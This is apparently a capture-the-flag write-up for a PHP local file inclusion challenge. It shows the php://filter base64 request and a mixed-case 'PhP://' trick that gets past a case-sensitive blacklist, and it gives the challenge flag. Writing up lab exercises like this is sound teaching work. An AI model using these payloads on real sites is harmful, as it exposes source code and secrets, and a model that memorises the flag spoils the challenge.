# Filtered Access - CTF Challenge Writeup

Filtered Access
600

- **URL:** https://mnbvcxzqwertyu-csc26.cybersecuritychallenge.al

## Flag

```
CSC26{f1lt3r3d_4cc3ss_byp4ss}
```

## Vulnerability

**Local File Inclusion (LFI) with PHP Filter Bypass**

## Solution

### Step 1: Initial Reconnaissance

Clicking on "Previous" and "Next" links caused PHP errors revealing:

- The URL structure: `navigation.php?p=previous`
- The correct parameter is actually `page` (not `p`)
- PHP `include()` function is used, appending `.php` to user input

Error messages exposed:

```
Warning: Undefined array key "page" in /var/www/html/navigation.php on line 11
Warning: include(.php): Failed to open stream: No such file or directory
```

### Step 2: Testing LFI

Tested `?page=flag` which returned:

> "Flag: It's here you just have to see it"

This hinted the flag is hidden in the PHP source code (likely a comment).

### Step 3: PHP Filter Attempt

Tried standard PHP filter wrapper:

```
?page=php://filter/convert.base64-encode/resource=flag
```

**Result:** "Dangerous input detected" - filtered!

### Step 4: Filter Bypass

The filter was **case-sensitive**. Using mixed case bypassed it:

```
?page=PhP://filter/convert.base64-encode/resource=flag
```

### Step 5: Decode & Capture

The base64 output decoded to:

```php
<?php
    #echo flag "CSC26{f1lt3r3d_4cc3ss_byp4ss}";
    echo "Flag: ";
    echo "It's here you just have to see it";
?>
```
